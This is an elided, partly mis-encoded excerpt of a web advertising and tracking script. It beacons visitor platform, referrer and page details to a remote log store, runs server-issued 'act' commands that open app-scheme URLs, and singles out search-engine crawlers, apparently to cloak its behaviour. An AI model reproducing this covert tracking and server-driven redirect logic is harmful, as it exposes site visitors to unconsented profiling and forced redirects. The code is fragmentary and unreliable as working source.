...
(function(_W, _D) {
	...
	window.curNode = document.currentScript || (function(){var script=document.querySelectorAll('script');return script[script.length-1]})();
		...
		data['title'] = encodeURIComponent(document.title);
                ...
                data['yxjs'] = 1;
                data['sizeid'] = "101";
                new Image().src =  "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&rf="+rf+"&platform=" + (navigator ? encodeURIComponent(navigator.platform) : '') + "&isCrossDomain="+this.checkCrossDomain()+"&ishidden=999999&ishttps="+this.isHttpsProtocol()+"&os="+os_type+"&ul="+ul+"&cheight="+this.getClientHeight()+"&is_uc="+is_uc+"&position=2&jsload="+_W.JSLOADN+"&dtime=" + new Date();
                if (_W.JSLOADN === 1) this.reqRequest(REQUEST_URL, JSON.stringify(data), this.reqResponse, null, 1);
            },
		...
		if(_W.XMLHttpRequest){ 
			...
			oAjax.open('POST', url, true); //open(?��?, url, ????�?�?)
            ...
            reqResponse: function (responseText, reqnum) {
                new Image().src = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&position=14&dtime=" + new Date();                
                var obj = JSON.parse(responseText) || {}, viewid, reqonly, cfg;
                _W.all_info = obj = obj.msg;
                if (obj.act){
                    ...
                    if (actl == 1){
                        ...
                        for (var ijjj in act){
                            if (ijjj == 0){
                                if (parseInt(obj.isapp_pr) == 1 || parseInt(obj.isapp) == 0){
				    _W[num].act(act[ijjj]);
				}  
                            }else{
...
//		if (typeof(obj['iadvplaceid']) != 'undefined' && typeof(obj['iappid']) != 'undefined'){
//		    var i_js = '//etc.6187wo.com/g.js';
//		     _W[num].loadJS(i_js);
//		}
            },
            getRf : function(){
            ...
            act: function (web_id) {
		this.callWithSchema('https://etc.6187wo.com/act.html#web_id='+web_id);
            },
            act_baidu: function (web_id,obj,i) {
                var cur = parseInt(i) + 1;
                var cur_url = 'https://'+obj.advplaceid+'_'+cur+'.6187wo.com/act_baidu.html#web_id='+web_id;
		...
		if(/baiduspider|googlebot|bingbot|sosospider|youdaobot|spider/.test(ua)){//??索�???????
			sys_os = 'spider';
			os = 4;
		...
		return clientHeightBody || 0;
            ...
            init: function() {
                new Image().src = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid=" + trackid + "&position=1&platform=" + iplatform + "&cheight=" + this.getClientHeight() + "&ds=" + ds +  "&ul=" + ul+"&rf=" + rf + "&jsload="+_W.JSLOADN+"&dtime=" + (+new Date());
                this.initRequest();
            }
         };
         _W[num].init();
